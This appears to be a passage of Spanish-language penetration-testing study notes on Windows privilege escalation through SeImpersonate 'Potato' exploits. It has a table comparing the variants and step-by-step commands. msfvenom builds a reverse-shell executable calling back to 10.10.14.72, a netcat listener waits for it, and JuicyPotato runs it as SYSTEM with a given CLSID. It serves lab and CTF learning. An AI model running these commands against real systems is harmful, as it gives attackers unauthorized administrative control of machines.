

Para explotar esto usaremos , pero tenemos que saber cual es el binario Potato que nos sirve:

| Potato                         | Versiones Windows                           | Privilegio                                | Dependencia clave                                   | Cuándo usarlo                                                                                |
| ------------------------------ | ------------------------------------------- | ----------------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **JuicyPotato**                | 7, 8, 8.1, 10 <1809 · Server 2008/2012/2016 | 7`SeImpersonate` o `SeAssignPrimaryToken` | Un **CLSID** válido para ese OS                     | Boxes **antiguos** (<1809 (Windows 10 2018)). Tu caso de Win7. Parcheado en 10 1809+ / 2019+ |
| **GodPotato**                  | 8–11 · Server 2012–2022                     | `SeImpersonate`                           | **.NET Framework**instalado                         | **Primera opción en Windows moderno.** El más universal hoy. NO funciona en Win7/2008        |
| **PrintSpoofer**               | 10 · Server 2016/2019 (algún 2022)          | `SeImpersonate` o `SeAssignPrimaryToken`  | Servicio **Print Spooler** activo                   | Segunda opción en moderno. Muy fiable, sin CLSID. Falla si el Spooler está apagado           |
| **RoguePotato**                | 10 1809+ · Server 2019                      | `SeImpersonate`                           | Redirector **socat en puerto 135**(resolución OXID) | Cuando JuicyPotato ya no aplica y PrintSpoofer no arranca. Más setup                         |
| **EfsPotato / SharpEfsPotato** | 8–11 · Server 2012–2022                     | `SeImpersonate`                           | Protocolo **MS-EFSR**                               | Plan B si el Spooler está deshabilitado (usa EFSRPC en su lugar)                             |
| **SweetPotato**                | Amplio (según técnica que elija)            | `SeImpersonate`                           | Ninguna fija (bundle)                               | "Navaja suiza": combina Juicy/Rogue/PrintSpoofer/EFS y prueba varias. Útil si no sabes cuál  |
| **RottenPotato / NG**          | 7, 8, 10 · Server 2008–2016                 | `SeImpersonate`                           | —                                                   | Histórico. Reemplazado por JuicyPotato. Casi no se usa ya                                    |
| **Hot Potato**                 | 7–10 early · Server 2008–2012               | Ninguno especial                          | NBNS spoof + WPAD + Windows Update                  | Muy viejo. Solo curiosidad/boxes legacy                                                      |

## IMPORTANTE

***Toda la informacion de los potatoes (Juicy, Hoten, Rotten, etc):*** https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato

# JuicyPotato

- ***x64 Arquitectura:*** https://github.com/ohpe/juicy-potato/releases/tag/v0.1
- ***x86 Arquitectura:*** https://github.com/ivanitlearning/Juicy-Potato-x86


### Paso 1: Crear shell

```ruby
# Shell de x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4444 -f exe -o shell.exe

# Shell de x86
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4444 -f exe -o shell.exe

```

### Paso 2: Ponerse a la escucha y ejecutar la shell con JuicyPotato

```ruby
# Nos ponemos a la escucha
sudo nc -lvnp 4444

# Ejecutamos JuiciPotato (En Windows 7)
JP.exe -t * -p C:\Windows\Temp\shell.exe -l 9999 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" # <- Este CLSID se encuentra facilmente en el repo de JuicyPotato
```




